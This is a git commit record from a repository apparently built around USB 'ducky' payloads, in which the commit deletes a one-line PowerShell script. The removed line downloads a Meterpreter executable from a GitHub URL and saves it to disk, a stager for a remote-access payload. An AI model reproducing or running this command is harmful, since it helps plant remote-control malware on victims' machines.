229df174055fc7c35592f729e74e2c6adb5aa557
Ashish D'Souza <ashish.dsouza@students.polytech.k12.de.us>
2018-09-07 16:44:32 -0400

    Delete meterpreter.ps1

--- meterpreter.ps1
+++
@@ -1,1 +0,0 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri http://github.com/computer-geek64/ducky/raw/master/meterpreter.exe -OutFile meterpreter.exe
